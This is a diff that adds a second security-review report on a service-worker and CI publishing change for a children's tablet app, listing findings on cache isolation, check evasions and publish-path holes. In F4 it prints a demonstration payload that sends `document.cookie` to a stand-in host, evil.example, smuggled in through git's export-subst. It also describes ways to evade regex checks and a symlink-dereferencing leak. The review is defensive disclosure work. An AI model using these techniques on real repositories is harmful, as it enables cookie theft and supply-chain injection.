@@ -479,3 +479,112 @@ Finding 15 also belongs in the "asserted as demonstrated, appears to have been a
 
 **No.** Two demonstrated paths put `main`'s content under `/stable/` while the invariant-4 step prints OK; check 3 has a demonstrated green-on-stale-cache regression (§0 flag-and-stop); the `/stable/` exclusion falls to a one-character typo; the publish job will deploy the origin-wide reaper currently on `refs/heads/stable` without any check reading it; and the runtime watcher built to guarantee nothing was missed has two demonstrated false greens of its own.
 `````
+
+---
+
+# SECOND PASS — after the stop was worked
+
+**Artifact reviewed:** commit `4d48aae`, frozen, every deliverable inside the freeze.
+**Verdict: still NOT safe to merge.** It confirmed 11 of the previous 18 as fixed
+and found 13 more, four of them serious. The builder accepts that verdict; the
+dispositions and the further fixes are in `docs/feedback/PUP-WO-0101.md`.
+
+**The deepest finding in the project so far is its F1**, and it is architectural
+rather than a slip: `sw.js`'s reap was prefix-bounded while its offline **read**
+was `CacheStorage.match`, which searches **every cache on the origin**. That
+falsifies northstar invariant 7 by the invariant's own stated test, with all six
+checks green — and no check could see it, because the test harness's `match()`
+returned `undefined` unconditionally. The line was unchanged since `2952aa1`; what
+made it a violation is this work order putting two caches on one origin.
+
+The full second report follows unedited. Its finding numbers F1–F13 are its own.
+
+`````text
+Tree re-verified frozen: `4d48aae`, `git status --short` empty at start and end. Every experiment ran on copies under `/tmp`; the working tree was never modified.
+
+# FINDINGS
+
+## F1 — northstar invariant 7 is falsified by its own stated test, with all six checks green. `sw.js:225`. DEMONSTRATED. HIGH.
+
+Invariant 7's falsification test is *"Load the promoted copy after the test copy has been cached; find any asset served from the other build."* I ran exactly that, in Chromium, against the frozen `sw.js`:
+
+    1. TEST copy (root) fetches the shared third-party asset -> /* THE TEST BUILD (root) ERA LIBRARY */
+       root cache now holds: [ 'http://localhost:34763/lib.js' ]
+    2. PROMOTED copy controlled: true
+       stable cache holds  : []                      <-- the promoted copy never cached it
+    >>> 3. PROMOTED copy, third party unreachable, was served:
+        "/* THE TEST BUILD (root) ERA LIBRARY */"
+
+`sw.js:225` is `return caches.match(event.request);` — the **global** `CacheStorage.match`, which searches *every cache on the origin*. The reap is prefix-bounded; **the read is origin-wide.** Two hundred lines of prose above it argue that no worker may touch what it does not own, and the offline path three lines below reads the other deploy path's cache.
+
+The line is unchanged from `2952aa1` — it is not a regression. **But PUP-WO-0101 is the change that puts two caches on one origin, which is what converts that line from harmless into an invariant-7 violation.** No check can see it: `sw-harness.mjs:26` is `async match() { return undefined; }`, so check 5 is structurally blind, and neither check 4 nor check 6 exercises offline. Fix is one line: `caches.open(CACHE_NAME).then(c => c.match(event.request))`.
+
+## F2 — check 6 hardcodes `v17`. The next legitimate app change is unshippable. DEMONSTRATED. HIGH (operational).
+
+Bumped `CACHE_VERSION` to `'v18'` — the change check 3 *mandates* whenever a cached asset changes — and ran the shipped check 6: FAIL root worker cache missing / FAIL stable worker cache missing / FAIL the /stable/ cache was DELETED, exit=1. Check 5 passes on the same tree. So: edit `index.html` -> check 3 demands a bump -> check 6 goes red -> `publish` `needs: checks` -> **nothing publishes.** Don't bump -> check 3 red. The two checks contradict each other on every app change. Worse, the failure message is a lie: it says the `/stable/` cache was deleted while the line above prints it intact. And `caches.open('puppad|%2F|v17')` *creates* the cache when the name has moved, so item 7 degrades to a vacuous `ok`.
+
+## F3 — finding 5 is NOT closed. Two demonstrated evasions of check 3. DEMONSTRATED x2. HIGH.
+
+**(a) No comment needed — two lines of plain, valid JS.** `String.match` still takes the *first* line-anchored hit: `var CACHE_VERSION = 'v18';` then `var CACHE_VERSION = 'v17';`. Check reads v18, worker uses v17, exit 0 with a false sentence printed.
+
+**(b) The original comment attack, verbatim, still works.** The `^\s*var` anchor requires a *line start*, not *code*. A block comment whose lines begin at column 0 defeats it — and so does the new derivation assertion, which is a bare `.test()` over the whole file.
+
+**One fairness correction to the record.** WO-0100's original `cacheName()` was the same first-match text-scrape. The new check is **strictly stronger** than what it replaced, so I do *not* think the §0 "a WO-0100 check was weakened" condition still fires. What fires is that the underlying proposition is still demonstrably false and the builder's table reports it closed. The right fix is a parse, not a better regex.
+
+## F4 — `git archive HEAD` does not write "the commit's tree and nothing else". Arbitrary JS from a commit message reaches the promoted copy through every gate. DEMONSTRATED. HIGH.
+
+`git archive` honours `.gitattributes` **from the tree it is archiving**:
+
+    === BYTES IN THE COMMIT TREE ===        =>  /* $Format:%s$ */
+    === BYTES git archive PUBLISHES ===     =>  /* */ ;fetch("https://evil.example/x?c="+document.cookie); /* */
+    commit:    .gitattributes index.html manifest.json
+    published: .gitattributes index.html          <-- manifest.json silently dropped (export-ignore)
+
+- **`export-subst`** injects the **commit message** into a published file. The tree reads innocently in review; the payload lives in `git log`, which no gate reads. Invariant 4 passes. `check-syntax`, `check-assets` and `check-cache-isolation` all exit 0 on the resulting promoted copy. That is live JS on the tablet.
+- **`export-ignore`** deletes files from the published copy while everything stays green — `check-assets` verifies a reference is *listed in urlsToCache*, never that the file exists. **Fail-open**, green build.
+- `actions/upload-pages-artifact@v4` tars with `--dereference`, so a committed symlink is **followed** and its target published; the runner filesystem is reachable that way.
+
+## F5 — check 6 is not run against the published copies, so the sandbox hole is open exactly on the publish path. DEMONSTRATED. HIGH.
+
+The publish job's per-copy loops run `check-syntax check-assets check-cache-isolation` and `check-load`. **Check 6 is in neither.** Planted the `typeof ExtendableEvent` gate in the **promoted** copy: publish gate exit=0, check-load PASSED, check 6 on the same copy FAILED. So the headline rule holds for four of six checks, and the two it misses include the one the file itself says nothing else can catch.
+
+## F6 — finding 4 is not fully closed. `/PupPad/stable` — bare, unencoded, fully canonical — is served by the root worker. DEMONSTRATED. MEDIUM-HIGH.
+
+The encoding fence is genuinely sound (double-encoding, `%2e%2e`, `%2F`/`%2f`, `%00`, malformed `%FF`, unicode solidus, backslash, `//`, `.`, `..` all decline). The hole is the shape nobody encoded: `FOREIGN_SUBTREE` is `/PupPad/stable/` and `indexOf` misses the directory itself. Pages 301s it to `/stable/`; a subresource fetch follows redirects, so the worker caches the **promoted copy's HTML under the root prefix**.
+
+## F7 — NEW regression: legitimate percent-encoded same-origin assets are declined and never cached. DEMONSTRATED. MEDIUM.
+
+`canon !== u.pathname` declines any path whose decode is not the identity. `/my%20photo.png` and `/caf%C3%A9.png` return 200 online and are **not** in the cache. Any asset with a space or non-ASCII character works online and is silently absent offline — invariant 3.
+
+## F8 — nothing in CI ever runs the two *published* workers together. DEMONSTRATED. MEDIUM-HIGH.
+
+Check 5 loads **one** `sw.js` at both scopes; check 6 serves **one** tree at both paths. The property in check 5's own title is never tested on the actual pair, which is the deployed state during every promotion lag. Its per-scope coverage is also asymmetric: the full survivor matrix runs only at ROOT_SCOPE.
+
+## F9 — every check is time-bounded, and nothing says so. DEMONSTRATED. MEDIUM-HIGH.
+
+A reap delayed past `performance.now() > 8000` passes all six checks, then destroys the other cache in a browser at t+10.5s. Check 5 has no observation window at all; check 4's is ~3.5s; check 6's ~5s.
+
+## F10 — finding 8 is NOT fixed and is NOT disclosed. MEDIUM.
+
+`ci.yml` says "five checks"; there are six. Every `sw.js:NN` citation still points at the **pre-PUP-WO-0101 worker**. `check-cache-name.mjs:183` is actively wrong: *"CACHE_NAME must be a plain quoted literal on sw.js:1"* — following it takes the legacy branch.
+
+## F11 — claims the code does not deliver. MEDIUM.
+
+`demo:3` "Not wired into the workflow" — FALSE, it is check 6. `feedback` row 10 "Proven by: New check-5 assertion" — FALSE, no such assertion exists. `sw.js:52` "there is no default" — FALSE of the file; the `'/'` fallback is still present, merely unreachable. `ci.yml:185-189` "nothing else can put unpromoted bytes into a published copy" — FALSE (F4). `ci.yml:9-12` "every copy is checked in the run that publishes it" — OVERSTATED, four of six. `check-load.mjs:236` "Both were tested and both stayed green" — FALSE/stale, contradicted in the same file. `feedback` "finding 15 is the only unclosed one" — FALSE; 5, 8, 17, 18 are also open.
+
+## F12 — publication is all-or-nothing, which disables rollback. REASONED. MEDIUM.
+
+Rolling `stable` back to a known-good commit now fails the publish job, as does shipping an urgent fix to `/PupPad/` while `/stable/` is stale. Fail-closed and defensible; undocumented, and presented purely as a win.
+
+## F13 — smaller, mostly fail-closed
+
+Checkouts use moving refs rather than `github.sha`; the stamp step is not fail-closed (the substitution is a printf ARGUMENT, so `set -e` does not fire — demonstrated writing an empty sha at exit 0); `grep -qi '^stable/'` false-positives on `Stable/`; awk `exit` can yield SIGPIPE 141 with no `::error::`; an empty `stable` tree is accepted; `sw-cdp.mjs` pending promises are never rejected on socket close; `setup-node@v7` vs `@v5` inconsistency.
+
+# The previous 18 — CONFIRMED as fixed
+
+1 FIXED · 2 FIXED · 7 FIXED cleanly · 9 FIXED · 10 FIXED in effect · 11 DISCLOSED · 12 FIXED (squatted the port with a foreign Chromium: exit 1) · 13 FIXED · 14 FIXED (hanging install -> never reached "active") · 16 FIXED · 17 HALF · 18 MOSTLY · 3,6 PARTIAL · 4 PARTIAL · 5 NOT CLOSED · 8 NOT CLOSED, NOT DISCLOSED · 15 honestly characterised.
+
+**And the merge-day path is clean, which matters most.** Simulated the upgrade on a device holding `pup-pad-v16` under the currently-live worker: legacy cache reaped by exact literal, new cache built, offline cold-load works (200, title "Pup Pad"). The single highest-stakes property of this merge holds.
+
+**Is this safe to merge to a branch that publishes to a three-year-old's tablet? No — not yet.** The merge-day path itself is clean and much of the rewrite is genuinely sound, but F2 makes the next app change unshippable, F3 leaves a check green on a stale-cache regression, F4 falsifies the load-bearing claim under the §7 fix with a working arbitrary-JS path to the promoted copy, and F1 falsifies northstar invariant 7 by its own stated test with every check green.
+`````
